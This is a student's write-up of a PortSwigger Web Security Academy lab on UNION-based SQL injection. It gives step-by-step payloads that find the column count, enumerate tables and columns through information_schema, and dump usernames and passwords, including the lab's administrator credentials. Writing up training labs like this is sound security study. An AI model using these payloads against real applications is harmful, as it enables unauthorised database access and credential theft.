# PortSwigger Web Security Academy - Lab Write-up

## Lab Name
SQL injection attack, listing the database contents on non-Oracle databases

## Difficulty
 (Apprentice / Practitioner)

## Objective
The goal of this lab is to log in as the `administrator` user by exploiting a SQL Injection vulnerability in the product category filter to extract the database structure, table names, column names, and passwords.

---

## Method of Exploitation (Step-by-Step)

### Step 1: Detect SQL Injection & Determine Number of Columns
First, I intercepted a category filter request using **Burp Suite** and sent it to the **Repeater**. 
To determine the number of columns and verify if they accept text (string) data, I injected a `UNION SELECT` payload:

```sql
'+UNION+SELECT+'abc',+'def'--
```
**Result:** The application returned a `200 OK` response, and `abc` and `def` were visible on the webpage. This proved the backend query has **2 columns** and both support **string data**.

---

### Step 2: Enumerate Table Names
Since this is a non-Oracle database, I queried `information_schema.tables` to list all available tables in the database:

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
**Result:** By searching the response, I discovered a hidden users table named: **`users_khynox`**.

---

### Step 3: Enumerate Column Names
Next, I queried `information_schema.columns` to find the exact column names belonging to the discovered `users_khynox` table:

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_khynox'--
```
**Result:** Inside the response, I located two critical columns:
1. Username Column: **`username_uxirfa`**
2. Password Column: **`password_mjyhhh`**

---

### Step 4: Extract Data (Data Exfiltration)
With the table and column names acquired, I crafted the final payload to extract the actual credentials:

```sql
'+UNION+SELECT+username_uxirfa,+password_mjyhhh+FROM+users_khynox--
```
**Result:** The webpage printed all users along with their passwords. I successfully recovered the administrator credentials:
* **Username:** `administrator`
* **Password:** `7go0czx8f94frea34q4b`

---

## Lab Resolution
I navigated to the **My Account** section of the website, logged in using the extracted `administrator` credentials, and successfully solved the lab.

## Key Takeaways
* Learned how to perform automated schema enumeration manually on non-Oracle databases using `information_schema`.
* Understood how to determine query columns using text data type verification.
* Mastered using SQL `UNION` operators to exfiltrate sensitive data directly onto an application UI.
